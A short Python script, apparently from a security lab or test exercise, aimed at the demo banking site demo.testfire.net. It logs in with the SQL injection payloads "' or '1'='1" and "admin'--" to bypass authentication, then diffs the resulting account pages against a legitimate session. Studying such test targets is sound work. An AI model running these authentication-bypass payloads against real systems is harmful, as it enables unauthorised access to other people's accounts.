#!/usr/bin/env python3
"""Dump /bank/main.jsp for the three sessions and diff identity markers."""
import difflib
import http.cookiejar
import re
import urllib.request
import urllib.parse

BASE = "http://demo.testfire.net"

class NR(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None

def sess(u, p):
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    op.open(urllib.request.Request(BASE + "/login.jsp", headers={"User-Agent": "s"}), timeout=30).read()
    d = urllib.parse.urlencode({"uid": u, "passw": p, "btnSubmit": "Login"}).encode()
    r = urllib.request.Request(BASE + "/doLogin", data=d, method="POST")
    r.add_header("Content-Type", "application/x-www-form-urlencoded")
    o = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NR())
    try:
        resp = o.open(r, timeout=30); loc = resp.headers.get("Location", ""); resp.read()
    except urllib.error.HTTPError as e:
        loc = e.headers.get("Location", ""); e.read()
    return op if "main.jsp" in loc else None

def get(op, path):
    with op.open(urllib.request.Request(BASE + path, headers={"User-Agent": "s"}), timeout=30) as r:
        return r.read().decode("utf-8", "replace")

pages = {}
for label, u, p in [("jsmith", "jsmith", "demo1234"),
                    ("bypass", "' or '1'='1", "x"),
                    ("adminx", "admin'--", "x")]:
    op = sess(u, p)
    pages[label] = get(op, "/bank/main.jsp") if op else ""

# strip the pure-navigation noise: show the text-only diff focus areas
def textof(h):
    h = re.sub(r"<script.*?</script>", " ", h, flags=re.S)
    h = re.sub(r"<[^>]+>", "|", h)
    h = re.sub(r"[|\s]+", " ", h)
    return h

tj, tb, ta = textof(pages["jsmith"]), textof(pages["bypass"]), textof(pages["adminx"])
print("=== jsmith vs bypass: differing lines ===")
for line in difflib.unified_diff(tj.split(" | "), tb.split(" | "), lineterm="", n=0):
    if line.startswith(("+", "-")) and not line.startswith(("+++", "---")):
        print(" ", line[:150])
print("\n=== jsmith vs adminx: differing lines ===")
for line in difflib.unified_diff(tj.split(" | "), ta.split(" | "), lineterm="", n=0):
    if line.startswith(("+", "-")) and not line.startswith(("+++", "---")):
        print(" ", line[:150])
